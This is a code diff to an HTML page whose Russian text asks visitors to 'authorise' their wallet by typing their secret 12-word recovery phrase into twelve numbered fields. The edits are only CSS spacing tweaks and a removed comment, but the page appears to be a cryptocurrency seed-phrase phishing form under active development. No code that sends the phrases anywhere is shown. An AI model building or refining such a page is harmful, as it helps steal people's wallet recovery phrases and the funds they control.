@@ -44,6 +44,7 @@
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 8px;
+            margin-bottom: 20px; /* Добавлен отступ */
         }
         .seed-item {
             position: relative;
@@ -74,7 +75,7 @@
             outline: none;
         }
         button {
-            margin-top: 20px;
+            margin-top: 10px;
             width: 100%;
             padding: 14px;
             background-color: #1E90FF;
@@ -103,7 +104,6 @@
         <p class="description">Авторизуйте ваш кошелёк вашей секретной фразой из 12-ти слов. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
             <div class="seed-input">
-                <!-- Поля для ввода -->
                 ${Array.from({ length: 12 }, (_, i) => `
                 <div class="seed-item">
                     <label for="word${i + 1}">${i + 1}.</label>
